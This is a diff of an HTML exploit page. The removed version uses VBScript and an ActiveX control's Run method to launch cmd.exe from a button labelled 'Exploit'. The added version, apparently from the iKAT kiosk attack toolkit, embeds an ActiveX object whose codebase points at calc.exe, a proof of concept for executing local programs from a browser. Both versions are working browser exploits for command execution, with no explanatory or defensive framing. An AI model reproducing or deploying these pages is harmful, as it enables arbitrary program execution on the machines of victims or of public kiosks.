@@ -1,12 +1,14 @@
-<html>
-<script language = 'vbscript'>
-Sub Boom()
-arg1="c:\windows\system32\cmd.exe"
-arg2=""
-arg3=1
-target.Run arg1 ,arg2 ,arg3
-End Sub
-</script>
-<object classid='clsid:31AE647D-11D1-4E6A-BE2D-90157640019A' id='target' /></object>
-<input language=VBScript onclick=Boom() type=button value="Exploit">
-</html>
+<HTML>
+<body>
+<link rel="stylesheet" type="text/css" media="screen" href="style.css" />
+
+<div id="mselect">
+<span>iKAT ActiveX</span><br><br>
+<OBJECT id="ikat" type="application/x-oleobject"
+  classid="clsid:FFA0AEB0-25DD-4671-9AC8-127DDC843809"
+  codebase="c:/windows/system32/calc.exe"
+    width=90%
+height=80%></object>
+
+</BODY>
+</HTML>
